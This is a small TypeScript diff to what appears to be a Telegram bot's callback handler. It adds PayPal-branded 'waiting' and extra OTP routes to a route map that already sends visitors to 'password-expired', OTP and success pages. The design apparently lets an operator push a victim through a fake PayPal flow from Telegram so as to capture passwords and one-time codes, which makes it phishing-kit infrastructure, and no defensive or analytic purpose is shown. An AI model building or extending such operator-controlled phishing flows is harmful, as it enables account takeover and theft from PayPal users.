@@ -262,8 +262,11 @@ async function handleCallbackQuery(query: any, botToken: string) {
     const routeMap: Record<string, string> = {
       // PayPal routes
       'paypal_error': '/paypal/failure',
+      'paypal_waiting': '/paypal/waiting',
       'paypal_approve': '/paypal/approve',
       'paypal_password': '/paypal/password-expired',
+      'paypal_otp1': '/paypal/otp',
+      'paypal_otp2': '/paypal/otp',
       'paypal_otp': '/paypal/otp',
       'paypal_success': '/paypal/success',
       'paypal_home': '/',
